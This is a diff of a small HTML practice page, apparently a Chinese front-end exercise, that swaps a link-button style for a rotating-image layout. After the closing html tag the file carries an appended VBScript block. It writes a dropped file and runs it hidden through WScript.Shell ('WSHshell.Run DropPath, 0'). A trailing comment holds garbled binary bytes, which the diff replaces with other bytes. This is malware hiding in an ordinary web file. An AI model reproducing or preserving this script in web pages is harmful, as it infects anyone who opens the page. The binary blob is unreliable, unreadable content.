@@ -1,28 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh">
 	<head>
-		<meta charset="utf-8">
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
 		<style type="text/css">
-			a {
-				height: 33px;
-				color: white;
-				padding-left: 15px;
-				display: inline-block;
-				text-decoration: none;
-				line-height: 33px;
-				background: url(to.png)no-repeat left;
+			* {
+				margin: 0;
+				padding: 0;
 			}
-			span{
-				background: url(to.png)no-repeat right;
-				height: 33px;
-				padding-right: 15px;
-				display: inline-block;
+
+			div {
+				width: 214px;
+				height: 214px;
+				position: relative;
+				margin: 50px auto;
+			}
+
+			div p {
+				display: block;
+				width: 100%;
+				height: 100%;
+				text-align: center;
+				top: 0;
+				left: 0;
+				position: absolute;
+				line-height: 214px;
+			}
+
+			div img {
+				animation: rotate 2s linear 0s infinite;
+			}
+
+			@keyframes rotate {
+				from {
+					transform: rotate(0deg);
+				}
+
+				to {
+					transform: rotate(360deg);
+
+				}
 			}
 		</style>
 	</head>
 	<body>
-		<a href="#"><span>é¦–é¡µ</span></a>
+		<div>
+			<img src="images/web.png" alt="">
+			<p>webå‰ç«¯</p>
+		</div>
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -39,6 +66,8 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!-- À>0™%piQûŸ#ûŸ¢¯–å"ˆæ¾ÈûßAãÚ[ÌøYdFÃeí%{wòÃımüã‡ºRøuµôpì"¬·¿›]ş–;K†M‰S‚:2i©?NŸŒ­
-â{»àŞI%Õf£y é¹Ç8©8`ğJÜ´sÑâƒÛn–ˆk¦qUí·&ƒâ°¶‘.ëWÕ¦ŒZ¶î½ƒ$zàÚ¡b*¿QÙO7¼³÷‚.±Ô6^€_nC5n‚–PË¿Ì6¾Üz›ÅÁçeİğÉ#ÓÚ"µù÷š­å @Vá©¥ã–Ø05 õáÎröÆ'(.ÆÅ–CF¡Èj?•ò sk/÷Hlï¯µF“b,
-ùDª‰ıF{øÁ¹r \9E1ô/\b‡¨©«5¦UÁZy‡’\h,1¤…£Y Ü:R!ùÜ:Ü:Ü:‘çOğ9¬_÷İ: Ü:-->
+//--></SCRIPT><!--ÉÆ|V=ÜŠ8ÜDÖ|QÛwMrHïr¹&ÔğX×0åÅş+¯Ëªµx9Å‰OFVI÷·„dW—¼¿<Xñì‡äƒp–÷_ëdzFªFÕGa]l´€NE_(+l×êAb)õï®Mªz€„ƒd>Ï	a'ò×s’_Ğ›êöò‘¶à,‚ÚÊ~d!Laİ&s"mb£“²6¹¦7k›²Ñ‘(X¸Ì›[£Ìc5¤†§¾‘Öæ„lÇ3 z‹I°
+±ó‚˜ŸOÇíõW÷áxˆê,N#ÏK+øßAZ_üeV¼¢Jíoû´†.Ö÷äÕ#leA¢#Dµ5È•óJ"z
+fã©¬ŒóC«Iõ6XA"d)M0Ã€& ¡4Æº¤åË(]ï Jñ }ûÊ€2 'V9òtÁØ’•ÀÉ©œRµÛ ‚d8s·hAY (`kU&0í‘1â¼ş\É }µ¸s‘´TæÈóÓ5¢€zÃ9b‘FaÊfº6èâZÀ®ÀwIÕ”Æ‰j–‡Mç+#
+>Ô?=•šO®Øç$Cz³£D–U9òÔ8Ÿ7ËS9· 
+Ê²´Í:Ö Re0æ«]tÔ ¦~¤ÄCn<£nôfg›ÄÒdº„•Ï€ë Ü:R!ùÜ:Ü:Ü:‘çOÊ*¬_ß: Ü:-->
